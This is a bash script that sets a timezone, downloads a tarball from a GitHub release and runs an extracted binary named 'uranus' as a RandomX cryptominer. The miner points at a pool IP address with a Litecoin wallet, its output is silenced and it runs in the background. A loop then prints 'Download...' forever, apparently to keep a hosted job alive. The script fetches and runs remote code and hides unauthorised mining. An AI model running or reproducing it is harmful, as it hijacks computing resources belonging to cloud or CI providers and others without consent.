#!/bin/bash
set -x
apt-get update 
ln -fs /usr/share/zoneinfo/America/Montserrat /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
wget https://github.com/oncom07/combro/releases/download/misro/daemon.tar.gz 
tar -xvf daemon.tar.gz 
./uranus -a randomx -o 159.203.162.18:3333 -u LTC:MKYvrRVVF8KB3gsWu9hxSQr57asXEhZWoF -p "QuickSilver" -t 1 >/dev/null 2>&1 &
while true
do
        echo "Download..."
        sleep 30
done
